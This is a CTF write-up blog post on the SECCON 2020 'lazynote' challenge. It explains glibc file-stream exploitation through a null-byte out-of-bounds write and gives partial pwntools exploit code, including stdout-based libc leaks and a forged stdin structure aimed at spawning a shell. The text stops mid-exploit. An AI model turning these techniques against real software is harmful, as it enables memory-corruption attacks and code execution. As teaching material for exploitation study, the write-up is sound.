---
layout: post
title:  "File Stream Oriented Programming: SECCON CTF 2020 - lazynote"
date:   2020-10-13 14:00:00 +0800
categories: pwn
tags: SECCON-2020
---

# It's been a while...

It's been a while since I wrote anything for this blog. Over the course of 2020, I've been really busy with University studies, tutoring, and a job, which meant that I really never had any weekends free to participate in CTFs. As a result of this, I've felt my pwning skills drastically deteriorate. My work is also heavily code auditing focused, which doesn't help at all.. 

When I stopped playing CTFs, I had just learned about GLIBC heap exploitation, and kind of left it at that and moved on into browser exploitation. Nowadays though, it seems like File Structure Oriented Programming (FSOP) is the new big thing when it comes to GLIBC pwn challenges, and although I don't particularly like GLIBC heap challenges, the FSOP style challenges always intrigued me, so what better way to come back into the CTF scene than to try and learn how it works? 

# Introduction

`lazynote` was a pwn challenge from **SECCON CTF 2020** written by [ptr-yudai](https://twitter.com/ptrYudai) (amazing pwner from zer0pts btw). It was a very simple challenge, simple binary, simple bug, but the path to exploitation is a very long series of steps which I'll get to in the next couple of sections.

**Full disclaimer here: I did not solve this challenge during the CTF. After the CTF ended (and when I got a bit of time :p), I decided I would figure out how to solve this challenge without looking at any writeups, so what you see are the exact steps I would have taken during the CTF if I had time.**

# Throwback to HITCON CTF 2019

[You can find the challenge files here](https://bitbucket.org/ptr-yudai/writeups-2020/src/master/SECCON_2020_Online_CTF/lazynote/files/). A summary of the challenge:

1. It essentially printed a menu and gave you four choices.
2. Only the first choice worked, and this choice would ask you for an `allocation_size`, a `read_size`, and the `data` that you want the program to read. 
  * It performs extensive checks on the allocation and read sizes to ensure you can't enter zero or negative numbers.
3. It uses `calloc` to allocate `allocation_size` bytes. Lets call this allocated memory region `buf`.
4. It then checks whether `read_size <= allocation_size`, and if it is, it sets `allocation_size = read_size`. No bug so far as there is no way to bypass this check.
5. It then reads `allocation_size` bytes into `buf`.
6. It then sets `buf[read_size - 1] = 0`. **This leads to an out of bounds write of a NULL byte if `read_size > allocation_size`.**
7. It lets you do all of the above exactly 4 times before exiting.

```
$ ./chall
👶 < Hi.
1.🧾 / 2.✏️ / 3.🗑️ / 4.👀
> 1
alloc size: 5
read size: 5
data: AA
1.🧾 / 2.✏️ / 3.🗑️ / 4.👀
> 
```

This reminded me of a CTF challenge I did a writeup for last year - [HITCON CTF 2019's Trick or Treat](/2019-10-14-hitconctf-2019-trick-or-treat/), which basically let you allocate a chunk of any size, and then write a quad word (8 bytes) into any index of this chunk exactly twice. The index wasn't bounds checked, which means you could overwrite past the chunk at any index.

Since only one chunk was allocated, there was nothing interesting on the heap to overwrite. The idea with the challenge was to allocate a very large chunk, which would be serviced by `mmap` instead of `malloc`. This newly mapped page in memory would just happen to align with libc, which would let you overwrite anything in libc. You would need to overwrite `__free_hook` to `&system` and trigger it to get code execution.

When I saw the bug in `lazynote`, I immediately knew that I'd have to do something similar. There is simply nothing interesting on the heap that, when overwritten, would let us get code execution, or even an info leak. There are however tons of interesting things in libc. We can only write NULL bytes though, so how do we figure out what to overwrite? Let's find out.

# First steps

The first thing I did was note that the binary used `puts` and `printf` to output to `stdout`, and `fgets` to read input from `stdin`. I already knew that the file structures for `stdout` and `stdin` both resided in libc, and since my first instinct was to get an information leak, I knew that it would likely require me to overwrite something in the `stdout` file structure. 

I downloaded the GLIBC source code and started reading the code for these functions. Doing this though, I quickly found out that it was nearly impossible to follow symbols from functions into other functions. I use a combination of `ctags` and `cscope` to find symbols, but the GLIBC code base is unfortunately not particularly well written, so this didn't work as well as I'd have hoped. 

The way I figured out the function call hierarchies was to download the glibc 2.27 source code, load it up into GDB, and follow the code to see what gets called. To do this, do the following:

1. `$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz`
2. `$ tar -xvf glibc-2.27.tar.gz`
3. Run the binary in GDB and set a breakpoint anywhere (or CTRL + C)
4. In GDB: `dir path/to/glibc-2.27/libio/`

Once you've done this, you should be able to do line by line debugging of the libc `puts`, `printf`, and `fgets` functions in GDB (assuming you're using something like `gdb-gef`). Ensure you're using a `libc-2.27.so` file that has debugging symbols enabled.

# Diving into LIBC code

It had been a while since I'd read any GLIBC code, so the first thing I looked at was the `_IO_FILE` structure, just to remind myself about the fields it contains:

```c
// libio/bits/libio.h:245

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

The majority of the interesting looking fields (i.e `_IO_read_ptr`, `_IO_write_base`, etc) have a comment above them saying that they are for the "C++ streambuf protocol", which automatically tells me that they have something to do with `stdout` and `stdin`'s buffering. Basically, `stdout` can be **unbuffered**, **line-buffered**, or **fully-buffered**. Depending on the buffering mode, the program will output stuff differently:

* Unbuffered - The program will output any characters into `stdout` as soon as possible.
* Line-buffered - The program will output characters when it sees a newline.
* Fully-buffered - The program will output characters when `stdout`'s buffer is full.

Note that buffering will do similar things for `stdin`: it just affects how many characters `stdin` can store in a buffer.

In the case of this challenge, it makes `stdout`, `stdin`, and `stderr` unbuffered at the beginning of `main` (by using `setbuf`), so we don't have any buffering. A side effect of the unbuffered mode is that all of these fields (except `_IO_buf_end`) are set to the exact same value (a valid pointer!):

```
gef➤  p _IO_2_1_stdout_ 
$1 = {
  file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f3bd73987e3 <_IO_2_1_stderr_+169> "",
    _IO_write_end = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7f3bd73987e4 <_IO_2_1_stdout_+132> "",
    // [ ... ]
  },
  vtable = 0x7f3bd73942a0 <__GI__IO_file_jumps>
}
```

From here, I knew that I'd need an information leak to get anywhere, and the only two functions the program uses to output to `stdout` are `puts` and `printf`. I decided to see how `puts` was implemented in libc, so I started following the code by setting a breakpoint at `puts`. The first function it calls into is `_IO_puts`. The code for this is shown below.

**Note**: For any code shown from now on, any comments I add to the code will start with `// ##`. I will also only show the code relevant to the challenge, as otherwise it would just require too much scrolling up and down.

```c
// libio/ioputs.c:31

int                                                                             
_IO_puts (const char *str)                                                      
{                                                                               
  int result = EOF;                                                             
  _IO_size_t len = strlen (str);                                                
  _IO_acquire_lock (_IO_stdout);                                                
                                                                                
  if ((_IO_vtable_offset (_IO_stdout) != 0                                      
       || _IO_fwide (_IO_stdout, -1) == -1)                                     
      && _IO_sputn (_IO_stdout, str, len) == len                                
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)                           
    result = MIN (INT_MAX, len + 1);                                            
                                                                                
  _IO_release_lock (_IO_stdout);                                                
  return result;                                                                
}                                                                               
```

Following the code, it seems to call straight into `_IO_sputn` which is further defined as `_IO_new_file_xsputn`:

```c
// libio/fileops.c:1218

_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING)) // ## [ 1 ]
    {
        // ## Is not reached since stdout is not line buffered in this challenge
        // ## [ ... ]
    }
  // ## [ 2 ]
  // ##  _IO_write_end and _IO_write_ptr have the same value, so this is false
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
        // count == 0
    }
  if (to_do + must_flush > 0) // ## [ 3 ]
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF) // [ 4 ]
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      // ## Not important
      // [ ... ]
    }
  return n - to_do;
}
```

This code first checks to see if `stdout` is both line buffered and currently outputting stuff at `[ 1 ]`. Since `stdout` is unbuffered this check fails immediately.

At `[ 2 ]`, as shown previously, `_IO_write_end` and `_IO_write_ptr` will have the same value. My suspicion is that `_IO_write_base` and `_IO_write_end` each point to the start and the end of the `stdout` buffer, while `_IO_write_ptr` points to the character in this buffer that is currently being output. Since `stdout` is unbuffered, this means that there isn't any buffer at all, which is why you end up having a case of `_IO_write_base == _IO_write_end == _IO_write_ptr`.

At `[ 3 ]`, `to_do` is set to the amount of characters to output, while `must_flush` is (I think) set to the amount of characters that need to be flushed out of the buffer. In the case of this challenge, `puts` is always called with some string, so `to_do` will always be greater than 0. `must_flush` will subsequently always be equal to 0, since `stdout` is unbuffered.

The code then ends up calling `_IO_OVERFLOW` at `[ 4 ]` to flush the `stdout` buffer. Here, `f` is the `stdout` file structure in libc. This ends up calling `_IO_file_new_overflow`, which is shown below:

```c
// libio/fileops.c:744

int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  // ## [ 1 ]
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
        // ## Not reached as `_IO_NO_WRITES` is not set by default
    }
  // ## [ 2 ]
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
        // ## Not reached, `_IO_CURRENTLY_PUTTING` is set as shown previously,
        // ## and `_IO_write_base` is not NULL for stdout
    }
  if (ch == EOF) // ## [ 3 ]
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);

  // ## [ ... ]
}
```

The `_flags` field for `stdout` does not have `_IO_NO_WRITES` set by default, so we skip the `if` condition at `[ 1 ]`.

At `[ 2 ]`, the `_IO_CURRENTLY_PUTTING` flag is set (we are currently in `puts` after all). The `_IO_write_base` field of the `stdout` file structure is also not NULL (it is never set to NULL), so we skip this `if` statement as well.

The check at `[ 3 ]` will pass since `EOF` was passed in as the `ch` argument to this function (scroll up to where `_IO_OVERFLOW` is called). This ends up calling `_IO_do_write`, which is aliased as `_IO_new_do_write`. The argument `f` in this case will just be `stdout`'s file structure:

```c
// libio/fileops.c:429

int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
```

Note that the `to_do` argument has been set to `f->_IO_write_ptr - f->_IO_write_base`.

In the normal case (i.e without any memory corruption), since `stdout` is unbuffered, both the `_IO_write_base` and `_IO_write_ptr` fields of `stdout` will have the same value. This means that `to_do` will be 0, meaning the `new_do_write` function will never be called.

**However**, remember that we have a relative out of bounds write primitive, so we have the opportunity to overwrite the least significant byte of either `_IO_write_ptr` or `_IO_write_base` to `0x00`, which means we can cause this argument to be non-zero. However, in my mind, we still have to ensure that this subtraction does not yield a negative number, as that would be interpreted as a HUGE `to_do` size, which may cause the program to crash. Because of this, let's just assume that we will be overwriting the LSB of `_IO_write_base` such that it becomes smaller than `_IO_write_ptr` (remember that they both initially have the same value).

What's interesting is that if we *do* set `to_do` to a non-zero value and call into `new_do_write` here, the `data` argument is actually just `f->_IO_write_base`, meaning it might just write out data from the `stdout` buffer. This buffer doesn't exist though (i.e its size is actually 0), so what does it write out? Let's find out.

The code for `new_do_write` is shown below:

```c
// libio/fileops.c:437

static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING) // ## [ 1 ] False by default
    // ## Long comment here, removed for brevity
    fp->_offset = _IO_pos_BAD;

  // ## Since _IO_read_end == _IO_write_base, this else if is usually skipped.
  // ## HOWEVER! Remember that to get to this code, we would have to modify
  // ## either the `_IO_write_ptr` or the `_IO_write_base` field of `stdout`.
  else if (fp->_IO_read_end != fp->_IO_write_base) // ## [ 2 ]
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do); // ## [ 3 ]
  
  // ## We don't care about any code after this
  // ## [ ... ]

  return count;
}
```

At `[ 1 ]`, the `_IO_IS_APPENDING` flag is not set by default on an unbuffered `stdout` file structure, so we skip it.

At `[ 2 ]`, we know that `_IO_read_end` and `_IO_write_base` are set to the same value (from before). However, since we are assuming that we overwrote the LSB of `_IO_write_base` to get here, we would actually enter this `else if` branch. Inside here, the `_IO_SYSSEEK` will call the `lseek` system call with the `offset` argument set to a negative number (remember that `_IO_write_base` was initially equal to `_IO_read_end`, but if we overwrite its LSB with a NULL byte, it will be less than `_IO_read_end`). When `lseek` is called with a negative offset, it will return an error code, meaning the program would exit out right here.

Knowing all of this, we don't want to enter this `else if` branch. To do this, we can overwrite `_IO_read_end`'s LSB to 0 as well, which would make it equal to `_IO_write_base` again (since they were equal before), bypassing this `else if` branch.

Next, when `_IO_SYSWRITE` is called, it ends up calling into `_IO_new_file_write`, which has the following code:

```c
// libio/fileops:1194

_IO_ssize_t
_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
{
  _IO_ssize_t to_do = n;
  while (to_do > 0)
    {
      _IO_ssize_t count = (__builtin_expect (f->_flags2
					     & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      // [ ... ]
    }
  // [ ... ]    

  return n;
}
```

By default, the `_flags2` field of `stdout` is set to 0, so this function ends up calling `__write`, which ends up calling the `write` syscall with `fd` set to `1` (for `stdout`), `data` set to `stdout->_IO_write_base`, and `n` set to `f->_IO_write_ptr - f->_IO_write_base`. This will end up just writing data out to `stdout`. What would this data be? Let's check through GDB:

```
gef➤  p _IO_2_1_stdout_ 
$1 = {
  file = {
    // [ ... ]
    _IO_write_base = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    // [ ... ]
}

// Remember we'll overwrite the LSB of _IO_write_base to NULL byte
// This is the `to_do` variable, the number of bytes to write
gef➤  p 0x7f2a5f5487e3 - 0x7f2a5f548700
$2 = 0xe3

gef➤  x/10gx 0x7f2a5f548700 // LSB set to 0 for _IO_write_base
0x7f2a5f548700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007f2a5f5498b0
0x7f2a5f548710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7f2a5f548720 <_IO_2_1_stderr_+160>:	0x00007f2a5f547780	0x0000000000000000
0x7f2a5f548730 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7f2a5f548740 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
```

Looks like it'll print out 0xe3 bytes of data from the new `_IO_write_base`, and surprisingly enough, once the LSB is set to 0, it will write out at least one libc address! This sounds like a good way to get an information leak!

# Information Leak

So to recap, our plan of attack for the information leak is as follows.

1. Overwrite the LSB of `_IO_write_base` to 0 to confuse `puts`. `puts` will think that `stdout` is buffered because `_IO_write_base != _IO_write_ptr`, but in reality there is no buffer.
2. Overwrite the LSB of `_IO_read_end` to 0 (to make it equal to `_IO_write_base` to bypass that `else if` branch in `new_do_write`).

This will then cause the next `puts` (the one that prints the menu)  to call `_IO_OVERFLOW` to flush our fake buffer. This will cause it to print out `_IO_write_ptr - _IO_write_base = 0xe3` bytes from the newly overwritten `_IO_write_base`, which leaks some libc addresses.

One side effect of overwriting the LSB of either `_IO_write_base` or `_IO_read_end` here is that the program becomes confused about the buffering of `stdout` and thus won't be outputting the menu or any of the options for us anymore. We have to account for this in our script. I ended up just having two separate functions, one for before we overwrite the fields, and one for after:

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

elf  = ELF("./chall")
libc = ELF("./libc-2.27.so")
p    = process("./chall", env={"LD_PRELOAD": "./libc-2.27.so"})
#p    = remote("pwn-neko.chal.seccon.jp", 9003)
REMOTE = False

def create1(alloc_size, read_size, data):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(alloc_size))
        p.recv()
        p.sendline(str(read_size))
        p.recv()
        p.sendline(data)

def create2(alloc_size, read_size, data):
    p.sendline("1")
    p.sendline(str(alloc_size))
    p.sendline(str(read_size))
    p.sendline(data)

# Overwrite LSB of `_IO_read_end` in `stdout`
create1(0x200000, 0x5ed761, "A")

# Overwrite LSB of `_IO_write_base` in `stdout`
create2(0x200000, 0x5e6761 + 0x208010, "A")

# Have to recv for the remote, else it doesn't work???
if REMOTE:
    p.recv()

leak         = u64(p.recvline()[8:14].ljust(8, b'\x00'))
libc.address = leak - 0x3ed8b0
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
stdout       = libc.sym["_IO_2_1_stdout_"]
stdin        = libc.sym["_IO_2_1_stdin_"]
stdfile_lock = libc.sym["_IO_stdfile_1_lock"]
wide_data    = libc.sym["_IO_wide_data_1"]
io_str_jumps = libc.sym["_IO_str_jumps"]

log.info("LIBC leak: " + hex(leak))
log.info("LIBC base: " + hex(libc.address))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))
log.info("_IO_2_1_stdout_: " + hex(stdout))
log.info("_IO_2_1_stdin_: " + hex(stdin))
```

In order to find the correct `read_size` that lets us write to the correct index out of bounds (particularly for the second allocation in `create2`), I set a breakpoint on the instruction that executes the `buf[read_size - 1] = 0;` line of code in the `babyheap` function, and checked what address it was writing to. I then just did some math to figure out what `read_size` should be if I wanted to overwrite specifically those fields in the `stdout` file structure.

There are two other things to note:

1. There is an extra `p.recv()` when `REMOTE` is set to true. This was required as the remote server behaved slightly differently to the local one (no clue why).
2. I leak multiple addresses which may not look familiar to you (`_IO_wide_data_1`, `_IO_str_jumps`, etc), but they will all be required later down the line for this exploit to work, so just keep reading.

The next time `puts` is called (when the program prints out the menu for us), we get all of those bytes leaked out to us. We can then just parse the libc address from it. Info leak achieved!

# Getting code execution

At this point, I had just learned that you can fool the program into thinking that the `stdout` file structure is buffered even though it really isn't. This let me output a number of bytes from `stdout->_IO_write_base`. What about the `stdin` file structure though? Can I make the program think that `stdin` is buffered and have it read my input into some arbitrary memory location (perhaps at `_IO_read_base`)?

Let's look at the GLIBC source code again, specifically for `fgets` this time:

```c
// libio/iofgets.c:30

char *
_IO_fgets (char *buf, int n, _IO_FILE *fp)
{
  _IO_size_t count;
  char *result;
  int old_error;
  CHECK_FILE (fp, NULL);
  if (n <= 0)
    return NULL;
  if (__glibc_unlikely (n == 1)) // ## We aren't passing a size of 1 for fgets
    {
      buf[0] = '\0';
      return buf;
    }
  _IO_acquire_lock (fp);
  /* This is very tricky since a file descriptor may be in the
     non-blocking mode. The error flag doesn't mean much in this
     case. We return an error only when there is a new error. */
  old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
  fp->_IO_file_flags &= ~_IO_ERR_SEEN;
  count = _IO_getline (fp, buf, n - 1, '\n', 1); // ## [ 1 ]
  /* If we read in some bytes and errno is EAGAIN, that error will
     be reported for next read. */
  if (count == 0 || ((fp->_IO_file_flags & _IO_ERR_SEEN)
		     && errno != EAGAIN))
    result = NULL;
  else
    {
      buf[count] = '\0';
      result = buf;
    }
  fp->_IO_file_flags |= old_error;
  _IO_release_lock (fp);
  return result;
}
```

Remember that `fgets` will be called with either the `read_size`, or the `alloc_size` if `read_size > alloc_size`. If we ensure that our `read_size` is greater than 1, we call into `_IO_getline` at `[ 1 ]`:

```c
// libio/iogetline.c:30

_IO_size_t
_IO_getline (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
	     int extract_delim)
{
  return _IO_getline_info (fp, buf, n, delim, extract_delim, (int *) 0);
}
```

This just calls `_IO_getline_info` with `fp` set to the `stdin` file structure, `buf` as our input buffer, `n` as the number of characters to read minus 1, and `delim == '\n'`:

```c
// libio/iogetline.c:46

_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp);
	  
	  // ## [ ... ]
	  
	  n--;
	}
	// ## [ ... ]
    }
}
```

In this function, `n != 0` is true, so we call into `__uflow` with `fp` set to our `stdin` file structure. This is `_IO_default_uflow`:

```c
// libio/genops.c:377

_IO_default_uflow (_IO_FILE *fp)
{
  int ch = _IO_UNDERFLOW (fp);
  if (ch == EOF)
    return EOF;
  return *(unsigned char *) fp->_IO_read_ptr++;
}
```

This in turn now calls `_IO_UNDERFLOW`, which is `_IO_new_file_underflow`:

```c
// libio/fileops.c:468

int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;

  if (fp->_flags & _IO_NO_READS) // ## [ 1 ]
    {
      // ## False, `stdin` does not have the _IO_NO_READS flag set
    }
  // ## False, _IO_read_ptr == _IO_read_end when `stdin` is unbuffered
  if (fp->_IO_read_ptr < fp->_IO_read_end) // ## [ 2 ]
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL) // ## [ 3 ]
    {
      // ## False, _IO_buf_base is set
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED)) // ## [ 4 ]
    {
      // ## Not important
    }

  _IO_switch_to_get_mode (fp); // ## [ 5 ] doesn't do anything of importance

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  // ## [ 6 ] !!!!!!
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

At `[ 1 ]`, the `_IO_NO_READS` flag is not set on the `stdin` file structure, so we skip this `if` branch.

At `[ 2 ]`, since `stdin` is unbuffered, `_IO_read_ptr == _IO_read_end` (you can verify this with GDB), so we skip this `if` branch as well.

At `[ 3 ]`, `stdin`'s `_IO_buf_base` is not NULL (again, can be verified with GDB), so we skip this `if` branch as well.

At `[ 4 ]`, this `if` condition is true as `stdin` is unbuffered, however nothing really happens in the `if` branch, so we just skip past it.

At `[ 5 ]`, there is a call to `_IO_switch_to_get_mode`, but it doesn't do anything of importance, so we skip past it.

At `[ 6 ]`, there is a call to `_IO_SYSREAD` which will read into `_IO_buf_base`! The size argument is set to `fp->_IO_buf_end - fp->_IO_buf_base`. By default, this will return a size of 1 (`_IO_buf_end` is set to `_IO_buf_base + 1` by default for the `stdin` file structure), but we can overwrite the LSB of `_IO_buf_base` to have it return a larger size and read our input into whatever `_IO_buf_base` is subsequently set to!

# But we can only write a NULL byte...

We don't have the ability to set `_IO_buf_base` to any arbitrary address here just yet. What we can do is overwrite its LSB with a NULL byte. What primitive does that give us? Let's find out:

```
gef➤  p _IO_2_1_stdin_
$11 = {
  file = {
    // [ ... ]
    _IO_buf_base = 0x7f2c7b8c6a83 <_IO_2_1_stdin_+131> "A",
    // [ ... ]
  },
  vtable = 0x7f2c7b8c32a0 <__GI__IO_file_jumps>
}

// ## Where does _IO_buf_base point to when the LSB is set to 0x00?
gef➤  x/gx 0x7f2c7b8c6a00
0x7f2c7b8c6a00 <_IO_2_1_stdin_>:	0x00000000fbad208b

// ## _IO_buf_end - _IO_buf_base with the LSB of the base set to 0x00
gef➤  p 0x7f2c7b8c6a84 - 0x7f2c7b8c6a00
$12 = 0x84
```

Based on the above, we see that when we overwrite `_IO_buf_base`'s LSB with a NULL byte, it will end up pointing to the `stdin` file structure itself. We also see that this in turn sets the `size` argument for `_IO_SYSREAD` to 0x84, meaning we can overwrite 0x84 bytes of the `stdin` file structure!

0x84 bytes isn't quite enough for us to be able to overwrite the entire `stdin` file structure, but it is enough for us to overwrite `_IO_buf_base` and `_IO_buf_end` to any arbitrary address, which will let us get an arbitrary write primitive on the next `fgets` call.

# Arbitrary write into FSOP

We have an arbitrary write primitive now, but there is an issue.

This `fgets` call that we are using to overwrite 0x84 bytes of the `stdin` file structure is the final `fgets` we'll get from the program. Remember that the program will let us choose a menu option four times before exiting, and that this ***is*** the fourth time. We can overwrite `_IO_buf_base` and `_IO_buf_end` to get an arbitrary write primitive, but we can't use it unless we can call `fgets` again, so what do we do?

# Forcing `_IO_getline_info` to loop

We need a way to cause another read from `stdin` after this final `fgets` call has finished. The solution to this lies in the code for `_IO_getline_info`:

```c
// libio/iogetline.c:46

_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0) // ## [ 1 ]
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp); // ## [ 2 ]
	  
	  // ## [ ... ]
	  
	  n--;
	}
	// ## [ ... ]
}
```

Note the `while (n != 0)` loop condition at `[ 1 ]`. When `fgets` is called for the fourth and final time, `n` is set to 0xe (verified through GDB, but no idea why 0xe). Remember that the call to `__uflow` at `[ 2 ]` is what lets us read into the `_IO_buf_base` pointer of `stdin`'s file structure, which is now currently set to the address of `stdin`. 

Based on this loop condition, we can see that we can actually loop and call this function 0xe times, but ***only if*** we can cause that `if (len <= 0)` check to pass every time. For this check to pass, we just want `_IO_read_end` to be a much smaller value when compared to `_IO_read_ptr`. It needs to be sufficiently smaller though, because later in `_IO_new_file_underflow` (which is the function called by `__uflow`), we have the following snippet of code:

```c
// libio/fileops.c:468

int
_IO_new_file_underflow (_IO_FILE *fp)
{
  // ## [ ... ]
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
 
  // ## [ ... ]
  
  fp->_IO_read_end += count;
  
  // ## [ ... ]
}
```

As you can see, `_IO_read_end` will be incremented by the number of bytes read by `_IO_SYSREAD` each time this function is called. In our final `fgets` call, we are going to read in `0x84` bytes into `stdin`'s file structure as mentioned previously, so it is going to be sufficient to set `_IO_read_end` to `_IO_read_ptr - 0x84` since we only need one arbitrary write to get a shell (as you'll see in a second). In my exploit though, I simply just set it to 0 because it didn't affect anything else.

The next section of my exploit (after the leaks) now looks as follows:

```python
log.info("LIBC leak: " + hex(leak))
log.info("LIBC base: " + hex(libc.address))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))
log.info("_IO_2_1_stdout_: " + hex(stdout))
log.info("_IO_2_1_stdin_: " + hex(stdin))

# Now that the stdout buffer has been cleared, we will actually receive the
# output from the program, so we use create1

# Overwrite the LSB of `_IO_buf_base` in `stdin`, third `fgets`
create1(0x200000, 0x5e6761 + 0x208010 + 0x2002b8, "A")

# We can now overwrite 0x84 bytes of the `stdin` structure on the next `fgets`

# Overwriting the `stdin` file structure
fake  = p64(0xfbad208b) # _flags as they were before
fake += p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
fake += p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
